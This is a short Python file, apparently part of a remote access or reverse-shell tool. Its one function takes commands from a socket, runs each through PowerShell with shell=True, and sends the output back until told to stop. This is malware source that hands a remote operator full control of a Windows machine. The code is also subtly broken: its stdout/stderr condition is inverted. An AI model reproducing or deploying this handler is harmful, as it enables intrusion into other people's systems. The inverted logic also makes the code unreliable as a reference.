import subprocess

from setuptools import Command

def execute_function(sock):
    print("[+] Executing command")
    while True:
        userCommand = sock.receiveData()
        print(userCommand)
        if userCommand == "stop":
            break
        output = subprocess.run(["powershell",userCommand], shell=True, capture_output=True)
        if output.stderr.decode("utf-8"):
            cmd_result = output.stdout.decode('utf-8')
        else:
            cmd_result = output.stderr.decode('utf-8')
        sock.sendData(cmd_result)